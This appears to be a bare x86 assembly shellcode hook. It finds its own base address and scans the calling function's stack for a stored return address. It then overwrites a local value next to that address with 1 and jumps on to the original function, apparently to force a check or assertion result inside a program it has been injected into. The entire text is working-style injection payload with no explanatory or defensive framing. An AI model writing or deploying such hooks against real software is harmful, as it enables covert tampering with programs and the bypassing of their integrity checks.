# globals
shellcode_size = 0x100
data_org_fn = 64
data_ret_addr = 68

# args
str = 8
file = 12
line = 16

# locals
scan_size = 0x2C
result_offset = -4

# prologue
enter 0, 0
push ebx
push esi

call SHORT back
back:
pop ebx
and ebx, 0xFFFFF000
add ebx, shellcode_size

# scanning the stack
mov esi, DWORD PTR data_ret_addr[ebx]
mov eax, ebp
add eax, scan_size
loop:
sub eax, 4
cmp eax, ebp
je SHORT done
cmp esi, DWORD PTR [eax]
jne SHORT loop
lea eax, DWORD PTR result_offset[eax]
mov [eax], 1

# fetch resume address
done:
mov eax, DWORD PTR data_org_fn[ebx]

# epilogue
pop esi
pop ebx
leave
jmp eax
